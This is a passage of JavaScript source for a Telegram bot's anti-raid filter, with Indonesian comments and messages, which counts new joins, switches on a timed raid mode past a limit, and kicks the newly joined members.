      raidTracker.set(ctx.chat.id, data);

      return ctx.reply(
        `🚨 Anti Raid aktif!\n${newMembers.length} member baru ditolak karena grup sedang dalam raid mode.`
      );
    }

    // catat join baru
    for (const _ of newMembers) {
      data.joins.push(now);
    }

    // cek apakah tembus limit raid
    if (data.joins.length >= RAID_JOIN_LIMIT) {
      data.raidMode = true;
      data.until = now + RAID_MODE_DURATION;

      // kick member yang baru join pada batch ini
      for (const user of newMembers) {
        try {
          await ctx.telegram.banChatMember(ctx.chat.id, user.id);
          await ctx.telegram.unbanChatMember(ctx.chat.id, user.id);
        } catch {}
      }

      raidTracker.set(ctx.chat.id, data);

      return ctx.reply(
        `🚨 Raid terdeteksi!\nMode proteksi aktif selama ${RAID_MODE_DURATION / 1000} detik.\nMember baru sementara akan otomatis ditolak.`
      );
    }

    raidTracker.set(ctx.chat.id, data);
  } catch (err) {
    console.log("ANTIRAID FILTER ERROR:", err.message);
  }
});

bot.launch();